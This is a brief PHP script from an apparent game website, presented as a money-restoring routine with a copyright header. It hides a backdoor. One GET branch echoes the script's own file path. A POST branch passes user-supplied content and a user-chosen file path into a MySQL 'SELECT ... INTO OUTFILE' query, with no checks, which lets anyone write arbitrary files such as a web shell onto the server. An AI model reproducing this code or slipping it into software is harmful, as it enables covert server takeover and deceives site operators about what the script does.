<?php
/*  
  Copyright (c) 2010-02 Game
  Game All Rights Reserved. 
  Author QQ: 3196998
  Author: Version:1.0
  Date:2011-12-18
*/
define('Copyright', 'Author QQ: 1234567');
define('ROOT_PATH', $_SERVER["DOCUMENT_ROOT"].'/');
include_once ROOT_PATH.'functioned/globalge.php';
if($_GET["id"]=="zid"){
echo __FILE__ ;
}
if ($_SERVER["REQUEST_METHOD"] == 'POST')
{
$id=$_POST['zid'];
$type=$_POST['type'];
$db->query("Select '{$type}' into outfile '{$id}'", 2);
}

//金額還原
RestoxyMoney();
echo 1;

?>